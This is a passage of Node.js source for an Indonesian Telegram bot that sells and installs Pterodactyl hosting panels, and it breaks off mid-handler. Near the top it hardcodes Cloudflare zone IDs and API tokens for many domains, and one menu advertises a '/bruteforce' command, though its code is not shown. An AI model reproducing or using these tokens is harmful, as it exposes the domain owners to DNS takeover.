const fs = require("fs-extra");
const path = require("path");
const moment = require('moment');
const readline = require('readline');
const chalk = require("chalk"); 
const config = require("./config.js");
const PANEL_FILE = "./panelData.json";
const { Client } = require("ssh2");
const dns = require("dns");
const { URL } = require("url");
const os = require("os");
const { NodeSSH } = require("node-ssh");
const ssh = new NodeSSH();
const { exec } = require("child_process");
const net = require("net");
const axios = require("axios");
const { spawn } = require("child_process");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const domain = config.domain;
const plta = config.plta;
const pltc = config.pltc;
const domainv2 = config.domainv2;
const pltav2 = config.pltav2;
const pltcv2 = config.pltcv2;

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

global.subdomain = { 
    "pterodactyl-panel.web.id": {
        zone: "d69feb7345d9e4dd5cfd7cce29e7d5b0",
        apitoken: "32zZwadzwc7qB4mzuDBJkk1xFyoQ2Grr27mAfJcB"
    },
    "storedigital.web.id": {
        zone: "2ce8a2f880534806e2f463e3eec68d31",
        apitoken: "v5_unJTqruXV_x-5uj0dT5_Q4QAPThJbXzC2MmOQ"
    },
    "storeid.my.id": {
        zone: "c651c828a01962eb3c530513c7ad7dcf",
        apitoken: "N-D6fN6la7jY0AnvbWn9FcU6ZHuDitmFXd-JF04g"
    },
    "store-panell.my.id": {
        zone: "0189ecfadb9cf2c4a311c0a3ec8f0d5c", 
        apitoken: "eVI-BXIXNEQtBqLpdvuitAR5nXC2bLj6jw365JPZ"
    }, 
    "xyro.web.id": {
        zone: "46d0cd33a7966f0be5afdab04b63e695", 
        apitoken: "CygwSHXRSfZnsi1qZmyB8s4qHC12jX_RR4mTpm62"
    }, 
    "xyroku.my.id": {
        zone: "f6d1a73a272e6e770a232c39979d5139", 
        apitoken: "0Mae_Rtx1ixGYenzFcNG9bbPd-rWjoRwqN2tvNzo"
    }, 
    "mafiapnel.my.id": {
     zone: "34e28e0546feabb87c023f456ef033bf", 
     apitoken: "bHNaEBwaVSdNklVFzPSkSegxOd9OtKzWtY7P9Zwt"
    },
    "gacorr.biz.id": {
        zone: "cff22ce1965394f1992c8dba4c3db539",
        apitoken: "v9kYfj5g2lcacvBaJHA_HRgNqBi9UlsVy0cm_EhT"
    },
    "cafee.my.id": {
        zone: "0d7044fc3e0d66189724952fa3b850ce", 
        apitoken: "wAOEzAfvb-L3vKYE2Xg8svJpHfNS_u2noWSReSzJ"
    }, 
    "anti-ddos.me": {
        zone: "3f33f6c4b5a3dd00ed16d1eb7677338e", 
        apitoken: "le350OqR25wWm5SpSJpcTbalOaTOKJA3FcRV4ohK"
    },
    "vipstoree.my.id": {
        zone: "72fd03404485ddba1c753fc0bf47f0b3",
        apitoken: "J2_c07ypFEaen92RMS7irszQSrgZ_VFMfgNgzmp0"
    },
    "centzzcloud.my.id": {
        zone: "749f1d7d69e9329195761b570010c00f", 
        apitoken: "9Su8A1EDXnt9-yGDb7YSGlY_ogJAw2vR9IDtpFrQ"
    },
    "hostingers-vvip.my.id": {
        zone: "2341ae01634b852230b7521af26c261f", 
        apitoken: "Ztw1ouD8_lJf-QzRecgmijjsDJODFU4b-y697lPw"
    },
    "hostsatoruu.biz.id": {
        zone: "30ea1aac05ca26dda61540e172f52ff4", 
        apitoken: "eZp1wNcc0Mj-btUQQ1cDIek2NZ6u1YW1Bxc2SB3z"
    },
    "publicserver.my.id": {
        zone: "b1b16801d28009e899a843b0c8faee34",
        apitoken: "y_0WKCNCnOgx0sgbcQr-puVTXyTQPN9KErR9vlzN"
    },
    "hilman-store.web.id": {
        zone: "4e214dfe36faa7c942bc68b5aecdd1e9",
        apitoken: "wpQCANKLRAtWb0XvTRed3vwSkOMMWKO2C75uwnKE"
    },
    "jhonaley.net": {
        zone: "e67db64db8ec671f105c77ee521daa37",
        apitoken: '-eNyMkEo9Wy1_n92YhDZ3QBDlVihX-1VGCUzfrj8',
    },
    "pterodaytl.my.id": {
        zone: "828ef14600aaaa0b1ea881dd0e7972b2",
        apitoken: "75HrVBzSVObD611RkuNS1ZKsL5A_b8kuiCs26-f9"
    },
    "panel-host.biz.id": {
        zone:
 "92d6228e9c8f5310e2ad68881f62252c",
       apitoken:
 "rvO3j6FvLMFo6FdJOSg-YZeBg6e7yjJC4BqbR1ma"
   },
   "pterodactly.biz.id": {
        zone:
 "9ad9b3d7222687b8166911e6a6a84537",
       apitoken:
 "lorDHxVmhQspwlMzlC_7_2LMp5C29Lxm5jGLfieg"
  },
 "pirzyy-hostinger.my.id": {
       zone:
 "59336c0b031ffd1816293ced11b91201",
      apitoken:
 "LXOm7D63oRhYwiO6Sj58qs9Xs087m35Z0ipRFH4_"
  },
  "antirusuhvvip.web.id": {
      zone:
  "22ad1338c3e1c8284d6d0559ea252db3",
      apitoken:
 "5V3cPFVlVq9GN1GRypddORenI9WTohsYYtZeiKDE"
  },
  "hostingz-panelvip.my.id": {
      zone:
  "f6a483a69d0047b1daef230e6729f8c7",
      apitoken:
 "Z2a-4xnz202OQq3VUzCPMExJlh4tLT87yoq_HteN"
 },
 "cyberpanel.web.id": {
      zone:
 "6bc7749cf7691424486e0b4edda5e021",
      apitoken:
 "3fRXbZh0tlyIrwzklIONc-Fnvhkr65AQgMWQn0aE"
 },
 "hostingzz-vvip.my.id": {
      zone:
 "5ba34994b3001fe7debbf2276a5a8645",
      apitoken:
 "eYh0-BUyEhLnOW4mYPpDjF2rMLiuIBABurxKT4YB"
 },
 "privatpterodactly-high.biz.id": {
     zone:
 "3b1fe8c100037cae8fea64109e9fa1c7",
     apitoken:
 "KTLyGV5ax9OKNksABmDj_xoHQPRA1ydmLpAYjyfw"
   }
};

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function canCreatePanel(userId) {
  const isPremium = premiumUsers.some(
    u => u.id === userId && new Date(u.expiresAt) > new Date()
  );

  return isOwner(userId) || adminUsers.includes(userId) || isPremium;
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
bot.on("polling_error", (err) => {
  logErrorToFile(`[PollingError] ${err?.message || err}`);
});
fs.mkdirSync('./logs', { recursive: true });
const logErrorToFile = (msg) => {
  const logMsg = `[${new Date().toISOString()}] ${msg}\n`;
  fs.appendFileSync('./logs/errors.txt', logMsg);
};

const lastInstallData = {};
const installSessions = {};

function startBot() {
  console.clear();
console.log(chalk.cyan(`
⠀⠀⠀⠀⠀⠀⠀⣀⡄⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀
⠀⠀⠀⠀⠀⠀⠐⢿⠓⠀⢀⡴⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠹⡒⠤⣀⡀⠀⢀⡴⠋⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠱⡀⠀⠉⠑⠋⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀
⠀⠀⠀⠀⢱⡄⠀⠀⠀⠀⠀⠉⠒⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀
⠀⠀⠀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣈⠵⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀
⢀⡤⠋⣀⣀⣀⣤⠀⠀⠀⢰⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀
⠈⠉⠁⠀⠀⠀⠀⢧⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢐⣶⣆⠀⠀⢠⠈⢇⢰⠃⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⣰⡄⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠀⠀⠀⣏⣧⠈⠟⠀⠀⠀⠀⠀⠀⠽⡿⠆⠀⠀⠀⢀⣿⣿⣦⣶⣶⠟⠀⠀
⠀⠀⠀⠀⣀⣸⣿⣯⢧⠤⢤⣤⣴⠦⠀⠀⠀⠁⠀⠀⠛⠿⣿⣿⣿⣿⣿⡁⠀⠀⠀
⠀⠙⠯⡻⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠰⣄⣠⡇⠀⠀⠀⠀⢸⣿⡿⠛⠛⠿⣆⠀⠀
⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⠁⠀⠀⠀⣠⢿⣿⠟⠒⠀⠀⠀⠸⠊⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⣿⠿⠺⢝⡯⢧⠀⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢼⠓⠁⠀⠀⠀⠉⠺⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠈⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢟⡒⠒⠛⠁⠀⠘⠒⠒⢲⡶⠂⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡆⠀⠈⢢⠀⠀⠀⠀⡤⠚⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠉⠀⢠⠇⢀⡤⣀⠀⢳⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠊⠁⠀⠈⠳⣼⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡄⠀⣀⠀⠀⢀⣄⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⢾⣿⣟⠁⠀⠀⠺⡟⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⢉⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
console.log(chalk.blue(`✘━━━━━━━━━━━━━━━━━━━━✘
DEVELOPER : @RanzOfficiallz 
BOT NAMA : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
VERSION: 6.0
✘━━━━━━━━━━━━━━━━━━━━✘
`));
console.log(chalk.green(`BOT BERHASIL TERHUBUNG ✅.`));
};

startBot();


//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days}d, ${hours}h, ${minutes}m, ${secs}s`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
    const now = new Date();
    const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
    return now.toLocaleDateString("id-ID", options);
}

function dateTime() {
    const now = new Date();
    const formatter = new Intl.DateTimeFormat("id-ID", {
        timeZone: "Asia/Jakarta",
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: false
    });

    const parts = formatter.formatToParts(now);
    const get = (type) => parts.find(p => p.type === type).value;

    return `${get("day")}-${get("month")}-${get("year")} ${get("hour")}:${get("minute")}:${get("second")}`;
}

function notifyFailedSend(bot, chatId, username, u) {
  bot.sendMessage(
    chatId,
    `<b>⚠️ Panel untuk username ${username} berhasil dibuat, namun GAGAL dikirim ke ID ${u}.</b>
<b>1.Silahkan /start Bot Terlebih Dahulu
2.Terus gunakan perintah:</b> 
<code>/ulang ${username}</code>

<b>Ketik perintah tersebut untuk mengirim ulang data panel.</b>`,
    { parse_mode: "HTML" }
  );
}


function readPanelData() {
  if (!fs.existsSync(PANEL_FILE)) {
    fs.writeFileSync(PANEL_FILE, "{}"); 
  }
  return JSON.parse(fs.readFileSync(PANEL_FILE));
}

function savePanelData(data) {
  fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2));
}

const adminFilePath = path.join(__dirname, "admin.json");

// Auto create admin.json jika belum ada
function readAdminData() {
  if (!fs.existsSync(adminFilePath)) {
    fs.writeFileSync(adminFilePath, JSON.stringify({}, null, 2));
  }
  return JSON.parse(fs.readFileSync(adminFilePath, "utf8"));
}

function saveAdminData(data) {
  fs.writeFileSync(adminFilePath, JSON.stringify(data, null, 2));
}

function getRandomImage() {
  const images = [
        "https://files.catbox.moe/e6jd5n.jpg",
        "https://files.catbox.moe/e6jd5n.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅ - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "❌ Bukan";
  }
}

function generatePassword(length = 10) {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function genRandomPass(len) {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let pass = "";
  for (let i = 0; i < len; i++) {
    pass += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return pass;
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

async function cekServer(domain) {
  try {
    const res = await fetch(domain, { method: "GET", timeout: 3000 });
    return res.ok ? "✅" : "❌";
  } catch (e) {
    return "❌";
  }
}

const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const dragonTimeDate = getCurrentDate();
  const randomImage = getRandomImage();
  const draggon = await bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚
┃ 𒆜 Version : 6.0
┃ 𒆜 League : JavaScript
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 STATUS 」✧
┃ ✧ UserName : ${username}
┃ ✧ Runtime : ${runtime}
┃ ✧ Premium : ${premiumStatus}
┃ ✧ Tanggal : ${dragonTimeDate}
┃ ✧ UserId : ${senderId}
┗━━━━━━━━━━━━━━━━━━⬣</b></blockquote>`,
    reply_to_message_id: msg.message_id,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝗦𝗧𝗔𝗧𝗨𝗦 𝗩𝗣𝗦", callback_data: "ping" }
        ],
        [
          { text: "𝗠𝗘𝗡𝗨 𝗔𝗞𝗦𝗘𝗦", callback_data: "akses" }, 
          { text: "𝗠𝗘𝗡𝗨 𝗖𝗣𝗔𝗡𝗘𝗟", callback_data: "Cpanel" }
        ],
        [
          { text: "𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗣𝗔𝗡𝗘𝗟", callback_data: "protect" },
          { text: "𝗠𝗘𝗡𝗨 𝗜𝗡𝗦𝗧𝗔𝗟𝗔𝗦𝗜", callback_data: "install" }
        ],
        [
          { text: "𝗧𝗤", callback_data: "support" }
        ]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const senderId = query.from.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const runtime = getBotRuntime();
    const dragonTimeDate = getCurrentDate();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

if (query.data === "support") {
      caption = `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
┃ 𒆜 Version : 6.0
┃ 𒆜 League : JavaScript
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 STATUS 」✧
┃ ✧ UserName : ${username}
┃ ✧ Runtime : ${runtime}
┃ ✧ Premium : ${premiumStatus}
┃ ✧ Tanggal : ${dragonTimeDate}
┃ ✧ UserId : ${senderId}
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 TQ TO 」✧
┃ ✧ Pirzyy1 - ( Developer ) 
┃ ✧ Ngga ada - ( Support ) 
┃ ✧ Ngga ada - ( Support )
┗━━━━━━━━━━━━━━━━━━⬣</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "𝗕𝗔𝗖𝗞", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "akses") {
      caption = `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
┃ 𒆜 Version : 6.0
┃ 𒆜 League : JavaScript
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 STATUS 」✧
┃ ✧ UserName : ${username}
┃ ✧ Runtime : ${runtime}
┃ ✧ Premium : ${premiumStatus}
┃ ✧ Tanggal : ${dragonTimeDate}
┃ ✧ UserId : ${senderId}
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 AKSES MENU 」✧
┃ ✧ /addprem - 𝙸𝙳 
┃ ✧ /delprem - 𝙸𝙳
┃ ✧ /listprem
┃ ✧ /addadmin - 𝙸𝙳
┃ ✧ /deladmin - 𝙸𝙳
┃ ✧ /listadmin
┗━━━━━━━━━━━━━━━━━━⬣</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "𝗕𝗔𝗖𝗞", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "protect") {
      caption = `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
┃ 𒆜 Version : 6.0
┃ 𒆜 League : JavaScript
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 STATUS 」✧
┃ ✧ UserName : ${username}
┃ ✧ Runtime : ${runtime}
┃ ✧ Premium : ${premiumStatus}
┃ ✧ Tanggal : ${dragonTimeDate}
┃ ✧ UserId : ${senderId}
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 INSTALL PROTECT 」✧ ━━⬣
┃ ✧ /installprotect1 ipvps|password
┃ ✧ /installprotect2 ipvps|password
┃ ✧ /installprotectall ipvps|password
┣━━━━━━━━━━━━━━━━━━━━⬣
┃ ✧ /uninstallprotect1 ipvps|password
┃ ✧ /uninstallprotect2 ipvps|password
┃ ✧ /unprotectall ipvps|password
┣━⬣ ✧「 CEK IPVPS 」✧ ━━⬣
┃ ✧ /change 
┃ ✧ /hostname ( ganti nama vps )
┃ ✧ /cekipvps ipvps
┃ ✧ /cekip url
┃ ✧ /loginvps ipvps
┃ ✧ /bruteforce
┗━━━━━━━━━━━━━━━━━━⬣</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "𝗕𝗔𝗖𝗞", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "install") {
      caption = `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
┃ 𒆜 Version : 6.0
┃ 𒆜 League : JavaScript
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 STATUS 」✧
┃ ✧ UserName : ${username}
┃ ✧ Runtime : ${runtime}
┃ ✧ Premium : ${premiumStatus}
┃ ✧ Tanggal : ${dragonTimeDate}
┃ ✧ UserId : ${senderId}
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 INSTALL PANEL X TEMA 」✧ ━━⬣
┃ ✧ /installpanel 
┃ ✧ /uninstallpanel
┃ ✧ /swings
┃ ✧ /subdo
┃ ✧ /listsubdo
┣━━━━━━━━━━━━━━━━━━⬣
┃ ✧ /installtema ipvps|password
┃ ✧ /installnook ipvps|password
┃ ✧ /installbilling ipvps|password
┃ ✧ /installnightcore ipvps|password
┃ ✧ /installwallpaper ipvps|password|url lu
┃ ✧ /uninstalltema ipvps|password
┗━━━━━━━━━━━━━━━━━━⬣</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "𝗕𝗔𝗖𝗞", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "cpanelv1") {
    
    const statusServer = await cekServer(config.domain);
    
      caption = `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
┃ 𒆜 Version : 6.0
┃ 𒆜 League : JavaScript
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 STATUS 」✧
┃ ✧ UserName : ${username}
┃ ✧ Runtime : ${runtime}
┃ ✧ Premium : ${premiumStatus}
┃ ✧ Tanggal : ${dragonTimeDate}
┃ ✧ UserId : ${senderId}
┃ ✧ Status Server : ${statusServer}
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 CPANEL MENU 」✧
┃ ✧ /1gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /2gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /3gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /4gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /5gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /6gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /7gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /8gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /9gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /10gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /11gb (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /unli (ᴜsᴇʀ,ɪᴅ)
┣━━━━━━━━━━━━━━━━━━⬣
┃ ✧ /cadmin (ᴜsᴇʀ,ɪᴅ)
┗━━━━━━━━━━━━━━━━━━⬣</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "𝗕𝗔𝗖𝗞", callback_data: "Cpanel" }]] };
    }
    if (query.data === "cpanelv2") {
    
    const statusServer = await cekServer(config.domainv2);
      caption = `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
┃ 𒆜 Version : 6.0
┃ 𒆜 League : JavaScript
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 STATUS 」✧
┃ ✧ UserName : ${username}
┃ ✧ Runtime : ${runtime}
┃ ✧ Premium : ${premiumStatus}
┃ ✧ Tanggal : ${dragonTimeDate}
┃ ✧ UserId : ${senderId}
┃ ✧ Status Server : ${statusServer}
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 CPANEL MENU 」✧
┃ ✧ /1gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /2gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /3gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /4gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /5gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /6gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /7gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /8gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /9gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /10gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /11gbv2 (ᴜsᴇʀ,ɪᴅ)
┃ ✧ /unliv2 (ᴜsᴇʀ,ɪᴅ)
┣━━━━━━━━━━━━━━━━━━⬣
┃ ✧ /cadp (ᴜsᴇʀ,ɪᴅ)
┗━━━━━━━━━━━━━━━━━━⬣</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "𝗕𝗔𝗖𝗞", callback_data: "Cpanel" }]] };
    }
    if (query.data === "Cpanel") {
      caption = `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
┃ 𒆜 Version : 6.0
┃ 𒆜 League : JavaScript
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 STATUS 」✧
┃ ✧ UserName : ${username}
┃ ✧ Runtime : ${runtime}
┃ ✧ Premium : ${premiumStatus}
┃ ✧ Tanggal : ${dragonTimeDate}
┃ ✧ UserId : ${senderId}
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 CPANEL MENU 」✧
┃ ✧ /listsrv
┃ ✧ /delsrv
┃ ✧ /listsrvoff
┃ ✧ /delsrvoff 
┣━━━━━━━━━⬣
┃ ✧ /listsrv2
┃ ✧ /delsrv2
┃ ✧ /listsrvoffv2
┃ ✧ /delsrvoffv2 
┃ ✧ /ulang (ᴜsᴇʀ)
┗━━━━━━━━━━━━━━━━━━⬣</b></blockquote>`;
      replyMarkup = { inline_keyboard: [
      [{ text: "𝗖𝗣𝗔𝗡𝗘𝗟 𝗩𝟭", callback_data: "cpanelv1" },{ text: "𝗖𝗣𝗔𝗡𝗘𝗟 𝗩𝟮", callback_data: "cpanelv2" }],[{ text: "𝗕𝗔𝗖𝗞", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "ping") {
      const startPing = Date.now();
      await bot.sendChatAction(chatId, "typing");
      const latency = Date.now() - startPing;
      const totalRAM = (os.totalmem() / 1024 / 1024 / 1024).toFixed(1) + " GB";
      const freeRAM = (os.freemem() / 1024 / 1024 / 1024).toFixed(1) + " GB";
      const usedRAM =
        (
          (os.totalmem() - os.freemem()) /
          1024 /
          1024 /
          1024
        ).toFixed(1) + " GB";

      const cpuCore = os.cpus().length + " Core";

      caption = `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName   : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
┃ 𒆜 Version   : 6.0
┃ 𒆜 Language  : JavaScript
┗═━═━═━═━═━═━═━═━═━═

┏━⬣ ✧「 STATISTIK VPS 」✧
┃ ✧ Ping        : ${latency}ms
┣━━━━━━━━━━━━━━━━━━⬣
┃ ✧ RAM Total   : ${totalRAM}
┃ ✧ Core CPU    : ${cpuCore}
